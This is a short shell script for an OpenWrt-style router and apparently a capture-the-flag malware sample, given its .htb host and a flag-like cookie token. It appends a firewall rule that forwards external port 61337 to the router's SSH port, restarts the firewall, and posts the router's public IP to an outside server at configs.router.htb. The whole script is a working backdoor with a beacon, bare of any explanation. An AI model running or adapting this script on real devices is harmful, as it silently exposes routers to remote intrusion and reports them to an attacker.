#!/bin/sh

WAN_IP=$(ip -4 -o addr show pppoe-wan | awk '{print $4}' | cut -d "/" -f 1)
ROUTER_IP=$(ip -4 -o addr show br-lan | awk '{print $4}' | cut -d "/" -f 1)

CONFIG="config redirect         \n\t              
	option dest 'lan'           \n\t
	option target 'DNAT'        \n\t 
	option name 'share'         \n\t
	option src 'wan'            \n\t
	option src_dport '61337'    \n\t
	option dest_port '22'       \n\t
	option family 'ipv4'        \n\t
	list proto 'tcpudp'         \n\t
	option dest_ip '${ROUTER_IP}'"

echo -e $CONFIG >> /etc/config/firewall
/etc/init.d/firewall restart

curl -X POST -H "Content-Type: application/json" -b "auth_token=SFRCe1owbWIxM3NfaDR2M19pbmY" -d '{"ip":"'${WAN_IP}'"}' http://configs.router.htb/reanimate